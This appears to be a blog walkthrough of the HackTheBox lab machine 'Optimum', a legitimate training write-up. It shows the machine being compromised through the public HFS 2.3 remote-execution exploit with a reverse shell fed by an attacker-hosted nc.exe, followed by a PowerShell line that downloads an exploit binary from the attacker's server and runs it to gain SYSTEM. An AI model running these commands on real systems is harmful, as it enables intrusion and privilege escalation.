---
layout: post
title: "HackTheBox Walkthrough - Optimum"
author: "Emmet Friel"
categories: HackTheBox
image: htb/optimum/optimum.png
---

# Introduction

This box was interesting in the sense it really honed in on the importance of enumeration, gave me a solid foundation on windows privilege escalation that I can refer back to and that you can’t rely on the exploit tools to do all the work for you! Lets get started.

# Reconnaissance & Enumeration

```bash
root@kali:~# nmap -sC -sV -O -p- -oN nmap.nmap 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 10:53 BST
Nmap scan report for 10.10.10.8
Host is up (0.029s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.40 seconds
```
- -sC : scripting scan, equivalent to also writing –script=default
- -sV: service version
- -O  : Operating System version
- -p- : scanning all 65536 ports
- -oN: Output result to a normal text file called nmap.nmap

| ![image]({{site.baseurl}}/assets/img/htb/optimum/hfs_opt.png) |
| :--: |
| *HFS Webpage running on port 80* |

Any webpage running on port 80 I always perform a dirb and nikto scan in the background, so I did just that however a quick search on the service version gave me everything I needed to get access into the system. 

The exploit I used was: <a href="https://www.exploit-db.com/exploits/39161" target="_blank_">Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)</a> which refers to CVE-2014-6287. The vulnerability is 
> “The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.” In other words, using the search bar on the website we can execute code server side using the null sequence.

There are now two approaches to exploit the machine: 
1. Execute commands in the search bar on the website using the null byte (%00)
2. Use the exploit script we found through a quick search.

For simplicity, I am going to use the scripting option.

# Shell Access

To use the script there are 3 important variables:

1. Change the IP address to your own: 
```bash
ip_addr = "192.168.44.128" #local IP address
```

2. Change the port which you are going to listen on:
```bash
	local_port = "443" # Local Port number
```

3. Host a webserver serving netcat (nc.exe). I am using SecLists GitHub repo for nc.exe which you can clone from their GitHub page.
```bash
#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!
```

Once I edited the script, I setup my netcat listener, python webserver and then executed the script: ```python 39161.py <target IP> <target port>``` 
Note that it may take a few attempts for the script to work. 


| ![image](/assets/img/htb/optimum/opt_terminal.png) |
| :--: |
| *Running the attack and having a reverse shell access to the victim machine* |


# Privilege Escalation using Windows Suggester

You can see I am user “kostas” from the terminal. I do not have Admin permissions so it’s time to escalate to root! To do this I used the <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank_">Windows Exploit Suggester</a> tool. The tool is really simple and extremely powerful, it compares all the patches on the machine to Microsoft’s patch database and outputs a “suggested” list of exploits. I have seen older tutorials use “Sherlock” instead of “Windows Suggester” but if you have a look at Sherlock’s GitHub, the repo hasn't been updated in 3 years :\ 

To do this, run ```systeminfo``` and then copy and paste the output to a file: ```systeminfo.txt``` in my case 

```windows
C:\Users\kostas\Desktop>systeminfo
```
```bash
root@kali:~/Documents/boxes/optimum# python windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2020-04-07-mssb.xls
[*] done
```
```bash
root@kali:~/Documents/boxes/optimum# python windows-exploit-suggester.py --database 2020-04-07-mssb.xls --systeminfo systeminfo.txt --quiet
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) – Critical
```

The output of windows-exploit-suggester shows a grand collection of exploits to try out so at this stage it’s really trial and error. Note that some attempts caused the machine to crash and so you would have to set up the reverse shell again, nothing major.
After trial and error, MS16-098 got me that nice root shell :)

I placed the exploit on the python webserver, downloaded it from the victims machine and then executed it.

```windows
C:\Users\kostas\Desktop>powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://10.X.X.X/bfill.exe','C:\Users\kostas\Desktop\exploit.exe')
```

```windows
C:\Users\kostas\Desktop>exploit.exe
exploit.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved. 

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```